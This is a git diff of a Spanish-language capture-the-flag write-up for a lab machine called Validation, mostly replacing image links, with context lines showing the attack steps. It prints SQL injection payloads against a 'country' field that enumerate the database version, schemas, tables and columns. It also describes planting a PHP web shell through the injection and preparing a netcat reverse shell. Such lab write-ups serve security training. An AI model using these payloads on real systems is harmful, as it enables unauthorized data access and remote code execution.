@@ -15,7 +15,7 @@ tags:
   - Strapi
   - Laravel
 image:
-  path: /assets/img/Horizontall/Horizontall.png
+  path: /assets/img/Validation/Validation.png
 ---
 
 ## Skills
@@ -105,15 +105,15 @@ Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
 
 Nos dirigimos a la página web y se visualiza lo siguiente:
 
-![[Pasted image 20240702115528.png]]
+![](/assets/img/Validation/image_1.png)
 
 Cuando `añadimos` un `username` vemos esto en la ruta `/contact.php`
 
-![[Pasted image 20240702120009.png]]
+![](/assets/img/Validation/image_2.png)
 
 He testeado una `inyección sql` en la parte del username pero no ha dado resultado, sin embargo, al probarla en la parte del `country` si que nos ha `devuelto` un `error`, por lo tanto estamos antes una `sql inyection error based`
 
-![[Pasted image 20240702120408.png]]
+![](/assets/img/Validation/image_3.png)
 
 Ahora vemos que no se ve el error
 
@@ -121,7 +121,7 @@ Ahora vemos que no se ve el error
 # username=test&country=Brazil'
 ```
 
-![[Pasted image 20240702120505.png]]
+![](/assets/img/Validation/image_4.png)
 
 Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2 nos da error
 
@@ -129,7 +129,7 @@ Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2
 # username=test&country=Brazil' order by 1-- - 
 ```
 
-![[Pasted image 20240702120627.png]]
+![](/assets/img/Validation/image_5.png)
 
 `Identificamos` la `versión` y el `tipo base de datos` a la que nos enfrentamos
 
@@ -137,7 +137,7 @@ Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2
 # username=test&country=Brazil' union select version()-- - 
 ```
 
-![[Pasted image 20240702123226.png]]
+![](/assets/img/Validation/image_6.png)
 
 Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir la que se está `utilizando`
 
@@ -145,7 +145,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 # username=test&country=Brazil' union select database()-- - 
 ```
 
-![[Pasted image 20240702123349.png]]
+![](/assets/img/Validation/image_7.png)
 
 `Listamos` todas las `bases de datos`
 
@@ -153,7 +153,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 # username=test&country=Brazil' union select schema_name from information_schema.schemata-- - 
 ```
 
-![[Pasted image 20240702123502.png]]
+![](/assets/img/Validation/image_8.png)
 
 `Listamos` el nombre de todas las `tablas` que pertenecen a la base de datos registration
 
@@ -161,7 +161,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 # username=test&country=Brazil' union select table_name from information_schema.tables where table_schema='registration'-- - 
 ```
 
-![[Pasted image 20240702123944.png]]
+![](/assets/img/Validation/image_9.png)
 
 `Listamos` todas las `columnas` para la base de datos registration y la tabla registration
 
@@ -169,11 +169,11 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 # username=test&country=Brazil' union select column_name from information_schema.columns where table_schema='registration'-- - 
 ```
 
-![[Pasted image 20240702124357.png]]
+![](/assets/img/Validation/image_10.png)
 
 Comprobamos si hay algo interesante en las tablas `username` y `userhash`, pero no encontramos nada
 
-![[Pasted image 20240702124608.png]]
+![](/assets/img/Validation/image_11.png)
 
 Usando `wfuzz` hemos encontrado la ruta` /config.php`, si conseguimos ganar acceso a la máquina víctima quizá en este archivo exista información interesante
 
@@ -217,11 +217,11 @@ Requests/sec.: 1018.026
 
 Al acceder a la ruta `/config.php` no vemos nada porque el `código` php está siendo `interpretado`, sin embargo, podemos ver si a través de la inyección sql tenemos `permisos` de `escritura`, si es así podremos `inyectar código php` en algún archivo de esa ruta y ganar acceso a la máquina víctima
 
-![[Pasted image 20240702180213.png]]
+![](/assets/img/Validation/image_12.png)
 
 Efectivamente ha funcionado, al acceder a `http://10.129.250.24/shell.php?cmd=whoami `comprobamos que tenemos ejecución de comandos
 
-![[Pasted image 20240702180309.png]]
+![](/assets/img/Validation/image_13.png)
 
 Por lo tanto vamos a mandarnos una `reverse shell` a nuestro equipo, lo primero es ponernos en escucha mediante `netcat` por el puerto `443`
 
